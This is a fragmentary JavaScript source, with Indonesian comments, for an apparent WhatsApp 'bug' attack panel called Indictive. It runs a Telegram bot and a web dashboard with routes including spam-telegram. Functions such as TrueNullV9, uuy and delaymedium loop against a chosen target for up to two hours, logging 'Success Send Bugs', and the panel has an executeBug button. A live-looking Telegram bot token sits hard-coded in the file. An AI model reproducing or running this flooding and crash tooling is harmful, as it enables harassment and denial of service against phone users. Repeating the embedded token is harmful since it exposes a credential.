...
bot.command("start", async (ctx) => {
  ...
  const teks = `
<blockquote>🍁 Indictive Core V4 Flash</blockquote>
...
async function TrueNullV9(sock, target) {
  ...
  const duration = 20 * 60 * 1000; // 20 menit dalam milidetik (diubah dari 2 jam)
  let iterationCount = 0;
  
  console.log(chalk.yellow(`⏳ Mulai proses selama 20 menit ke ${target}...`));
  
  while (Date.now() - startTime < duration) {
    iterationCount++;
    console.log(`Iterasi ke-${iterationCount}, Target: ${target}`);
    ...
    try {
      ...
      console.error(`Error pada iterasi ${iterationCount}:`, err.message);
    }
    ...
    try {
      ...
      console.error(`Error X_Mention pada iterasi ${iterationCount}:`, err.message);
    }

    // Delay 3 detik antara iterasi
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    // Tampilkan progress setiap 5 iterasi (karena durasi lebih pendek)
    if (iterationCount % 5 === 0) {
      const elapsedMinutes = Math.floor((Date.now() - startTime) / 60000);
      const elapsedSeconds = Math.floor((Date.now() - startTime) / 1000) % 60;
      console.log(`Progress: ${elapsedMinutes}m ${elapsedSeconds}s berlalu, ${iterationCount} iterasi selesai`);
    }
  }
  
  console.log(chalk.green(`✅ Selesai! Total waktu: 20 menit, Total iterasi: ${iterationCount}`));
}

async function uuy(sock, target) {
  const startTime = Date.now();
  const duration = 2 * 60 * 60 * 1000; // 2 jam dalam milidetik
  let iterationCount = 0;
  ...
  while (Date.now() - startTime < duration) {
    ...
    // Tampilkan progress setiap 30 iterasi
    if (iterationCount % 30 === 0) {
      const elapsedMinutes = Math.floor((Date.now() - startTime) / 60000);
      console.log(`Progress: ${elapsedMinutes} menit berlalu, ${iterationCount} iterasi selesai`);
    }
  }
  
  console.log(`Loop selesai! Total waktu: 2 jam, Total iterasi: ${iterationCount}`);
}
...
async function delaymedium(sock, target) {
     for (let i = 0; i < 5; i++) {
         await sockAyunBelovedX(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
...
*/
const BOT_TOKEN = "7621390139:AAFA0ssqfgDORUHn3vY-trrEvgv47zVDCPM";
...
app.get("/youtube-downloader", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "youtube-downloader.html");
...
app.get("/test-speed", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "test-speed.html");
  fs.readFile(filePath, "utf8", (err, html) => {
...
app.get("/spam-telegram", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "spam-telegram.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
...
app.get("/pinterest-downloader", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "pinterest-downloader.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
...
/*app.get("/anime", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "anime.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
...
app.get("/nsfw-anime", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "nsfw-anime.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
...
app.get("/myinfo", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "profil.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
...
app.get("/quote", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "iqc.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
...
app.get("/get-code", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "get-code");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
...
app.get("/sender", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "sender.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
...
<body>
    ...
    <div class="container">
        <header>
            <div class="header-left">
                <h1>INDICTIVE</h1>
                <p>System Execution Core // v2.0</p>
            </div>
    ...
    <script>
        ...
        document.addEventListener('DOMContentLoaded', function() {
            ...
            // Update sender count periodically
        ...
        function executeBug() {
            ...
            .then(html => {
                // If server returns HTML (redirect), we'll handle the response differently
